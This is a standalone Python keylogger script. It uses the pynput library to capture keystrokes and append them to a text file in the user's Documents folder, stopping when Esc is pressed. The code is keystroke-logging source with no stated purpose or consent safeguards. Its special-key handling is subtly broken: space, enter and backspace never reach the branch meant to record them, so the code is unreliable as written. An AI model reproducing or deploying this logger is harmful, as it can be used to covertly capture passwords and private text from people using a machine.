from pynput import keyboard
import os

# Define the file path
file_path = os.path.join(os.environ["USERPROFILE"], "Documents", "output.txt")

# Function to clear the contents of the output file
def clear_output_file():
    with open(file_path, 'w') as f:
        f.write('')

# Set to keep track of pressed keys
pressed_keys = set()

# Function to handle key press events
def on_press(key):
    try:
        # Handle regular key presses
        if hasattr(key, 'char') and key.char is not None:
            if key not in pressed_keys:
                pressed_keys.add(key)
                with open(file_path, 'a') as f:
                    f.write(key.char)
    except AttributeError:
        # Handle special key presses
        with open(file_path, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.backspace:
                # Remove the last character from the file
                f.seek(0, os.SEEK_END)
                size = f.tell()
                if size > 0:
                    f.seek(size - 1)
                    f.truncate()
            else:
                pass  # Ignore other special keys

def on_release(key):
    # Stop listener
    if key == keyboard.Key.esc:
        return False
    if key in pressed_keys:
        pressed_keys.remove(key)

# Clear the output file before starting
clear_output_file()

# Ensure the file exists
if not os.path.exists(file_path):
    with open(file_path, 'w') as f:
        pass

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
